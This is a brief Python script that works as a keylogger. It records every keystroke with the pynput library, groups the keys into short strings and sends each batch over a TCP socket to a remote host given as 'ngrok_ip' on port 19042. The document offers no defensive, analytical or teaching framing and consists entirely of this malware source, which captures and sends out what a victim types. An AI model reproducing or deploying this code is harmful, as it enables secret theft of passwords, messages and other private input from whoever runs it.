import socket
from pynput.keyboard import Listener
conn=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host='ngrok_ip'
port=19042
conn.connect((host,port))
print("Connected...")
num=0
letters=[]
def on_press(key):
	global num,letters
	letters.append(key)
	num=num+1
	if(num>10):
		num=0
		m=""
		for i in letters:
			i=str(i)
			i=i.replace("'","")
			if(i=="Key.space"):
				i=" "
			m=m+i
		print(m)
		letters=[]
		conn.send(m.encode())
with Listener(on_press=on_press)as listener:
	listener.join()